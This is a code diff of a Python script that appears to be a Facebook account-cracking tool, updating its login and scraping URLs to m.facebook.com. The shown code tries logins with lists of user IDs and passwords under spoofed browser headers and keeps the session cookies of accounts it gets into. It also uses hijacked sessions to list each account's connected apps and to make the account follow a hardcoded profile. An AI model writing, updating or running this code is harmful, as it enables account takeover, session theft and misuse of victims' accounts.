@@ -342,7 +342,7 @@ twf = []
 
 #---------------------[APPLICATION CHECKER]---------------------#
 def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -353,7 +353,7 @@ def cek_apk(session,coki):
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
             #created by hbf team(owner) AHAD
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -371,7 +371,7 @@ def cek_apk(session,coki):
 
 def follow(ses,coki):
     ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
+    r = sop(ses.get('https://m.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
     get = r.find('a', string='Follow').get('href')
     ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
@@ -652,7 +652,7 @@ def freeq(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {
-		    'authority': 'x.facebook.com',
+		    'authority': 'm.facebook.com',
 		    'cache-control': 'max-age=0',
 		    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99"',
 		    'sec-ch-ua-mobile': '?1',
@@ -666,7 +666,7 @@ def freeq(uid,pwx,tl):
 		    'sec-fetch-dest': 'document',
  		   'referer': 'https://m.alpha.facebook.com/login',
  		   'accept-language': 'en-US,en;q=0.9',}
-            lo = session.post('https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=header_freefb).text
+            lo = session.post('https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
